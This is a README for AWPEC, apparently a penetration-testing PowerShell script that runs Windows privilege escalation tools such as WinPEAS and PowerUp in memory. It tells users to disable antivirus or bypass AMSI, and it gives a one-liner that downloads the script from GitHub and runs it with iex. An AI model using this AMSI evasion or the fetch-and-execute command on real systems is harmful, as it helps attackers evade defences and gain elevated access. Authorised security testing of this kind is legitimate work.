<div align="center" width="100%">
    <h1>🔥 AWPEC 🔥</h1>
    <h3><b>Automated Windows Privilege Escalation Checks</b></h3>
    <p>PowerShell script that automates the tedious tasks of Windows Privilege Escalation</p><p>
    <a target="_blank" href="https://github.com/l4rm4nd"><img src="https://img.shields.io/badge/maintainer-LRVT-orange" /></a><br>
    <a href="https://www.buymeacoffee.com/LRVT" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
</div>

## 💎 Features

AWPEC runs the following privilege escalation tools in memory:

- PowerUp
- Seatbelt
- PrivescCheck
- WinPEAS

It also supports running ADRecon and auditing the results if you find yourself within an Active Directory domain context.

## 🎓 Usage

Since the AWPEC PowerShell script relies on various 3rd party tools, which are known for being flagged by AV, we have to either disable antivirus or actively bypass AMSI. Furthermore, as we utilize `PowerSharpPack`, which reflectively loads C# code, we must ensure to bypass AMSI .NET as well. A basic AMSI PS bypass is not sufficient!

So open a low-priv PowerShell terminal session, bypass AMSI (PS + .NET) and then run the PS script:

````powershell
# run the AWPEC script
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Haxxnet/AWPEC/main/Invoke-AWPEC.ps1')
````

## 💎 Acknowledgment & Credits

Many thanks to the following individuals:

- ❤ https://github.com/HarmJ0y
- ❤ https://github.com/leechristensen
- ❤ https://github.com/S3cur3Th1sSh1t
- ❤ https://github.com/carlospolop
- ❤ https://github.com/itm4n
